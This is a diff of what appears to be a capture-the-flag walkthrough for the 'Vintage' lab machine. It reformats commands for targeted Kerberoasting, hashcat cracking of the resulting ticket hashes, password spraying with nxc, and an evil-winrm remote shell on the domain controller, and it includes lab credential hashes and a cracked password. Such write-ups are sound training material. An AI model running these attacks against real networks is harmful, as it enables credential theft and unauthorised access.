@@ -138,7 +138,9 @@ bloodyAD -d vintage.htb -u 'gmsa01$' -p '0851299c01b944d01099fc977eaa6c67' -f rc
 
 Re-running the automated script now successfully yielded all three TGS hashes:
 
-` KRB5CCNAME=gmsa01$.ccache python3 targetedKerberoast.py -d vintage.htb -k --no-pass --dc-host dc01.vintage.htb`
+``` 
+KRB5CCNAME=gmsa01$.ccache python3 targetedKerberoast.py -d vintage.htb -k --no-pass --dc-host dc01.vintage.htb
+```
 
 <img width="1905" height="593" alt="image" src="https://github.com/user-attachments/assets/d38cc787-8d49-4052-a9a3-ed8e3cb9aa2a" />
 
@@ -177,13 +179,17 @@ nxc ldap dc01.vintage.htb -k -u 'gmsa01$' -H 0851299c01b944d01099fc977eaa6c67 -k
 
 We subjected the extracted TGS hashes to an offline dictionary attack using Hashcat and the rockyou wordlist.
 
-`hashcat -m 13100 hashes /usr/share/wordlists/rockyou.txt --force`
+```
+hashcat -m 13100 hashes /usr/share/wordlists/rockyou.txt --force
+```
 
 <img width="1896" height="162" alt="image" src="https://github.com/user-attachments/assets/c32b7e34-e188-4a59-ae22-bbaa8efd91c5" />
 
 Relying on our earlier JSON analysis which highlighted potential password reuse we performed a password spraying attack against the domain users using this newly discovered password.
 
-`nxc ldap dc01.vintage.htb -k -u users.txt -p Zer0the0ne -k --continue-on-success`
+```
+nxc ldap dc01.vintage.htb -k -u users.txt -p Zer0the0ne -k --continue-on-success
+```
 
 This confirmed that the user **c.neri** shared the exact same password.
 
@@ -206,7 +212,9 @@ getTGT.py vintage.htb/c.neri:Zer0the0ne -dc-ip 10.129.231.205
 
 With the TGT loaded into the environment, we invoked **evil-winrm**, specifying the realm to strictly enforce Kerberos authentication, successfully establishing a remote shell on the target machine.
 
-`KRB5CCNAME=c.neri.ccache evil-winrm -i dc01.vintage.htb -r vintage.htb `
+```
+KRB5CCNAME=c.neri.ccache evil-winrm -i dc01.vintage.htb -r vintage.htb
+```
 
 
 
